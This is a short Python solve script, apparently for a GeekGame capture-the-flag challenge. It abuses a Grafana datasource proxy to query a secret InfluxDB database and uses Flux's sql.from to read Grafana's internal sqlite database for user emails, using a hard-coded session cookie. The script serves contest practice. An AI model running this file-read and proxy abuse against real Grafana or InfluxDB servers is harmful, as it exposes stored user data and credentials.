import json

import requests

HOST = 'https://prob04-duilwyj9.geekgame.pku.edu.cn/'


headers = {
    'User-Agent': 'influx/2.7.5 (darwin) Sha/a79a2a1b82 Date/2024-04-16T14:32:10Z',
    'Cookie': 'grafana_session_expiry=1760794272; grafana_session=c5d8a64c8544240850872410418341aa',
    'X-DS-Authorization': 'Token token',
    'Accept': 'application/csv',
    'Content-Type': 'application/vnd.flux',
}


def post(path, data=None):
    url = f"{HOST}{path}"
    response = requests.post(url, data=data, headers=headers)
    return response.content


def get(path, data=None):
    url = f"{HOST}{path}"
    response = requests.get(url, data=data, headers=headers)
    return response.content


def flag1():
    sql = 'SHOW DATABASES'  # db=empty 然后可以获取到 secret_121428436
    sql = 'select * from "flag1"'
    encoded_sql = requests.utils.quote(sql)
    response = post(
        f'/api/datasources/proxy/uid/bf04aru9rasxsb/query?db=secret_121428436&q={encoded_sql}')
    print(response)


def flag2():
    data = b'''import "sql"
sql.from(
    driverName: "sqlite3",
    dataSourceName: "file:/var/lib/grafana/grafana.db?cache=shared&mode=ro",
    query: "SELECT email FROM user",
)
'''

    # 先拿到 org ID
    response = get(
        f'/api/datasources/proxy/uid/bf04aru9rasxsb/api/v2/buckets')
    print(json.loads(response))

    response = post(
        f'/api/datasources/proxy/uid/bf04aru9rasxsb/api/v2/query?org=b25722863b29931d', data=data)  # , data=data)
    print(response)

    # 从 response 里拿到 email
    email = '666c61677b70723156314c4547652d657363616c6154494f6e2d576954482d6c4f76336c792d496e466c555864627d0a'
    print(bytes.fromhex(email).decode())


if __name__ == "__main__":
    # flag1()
    flag2()
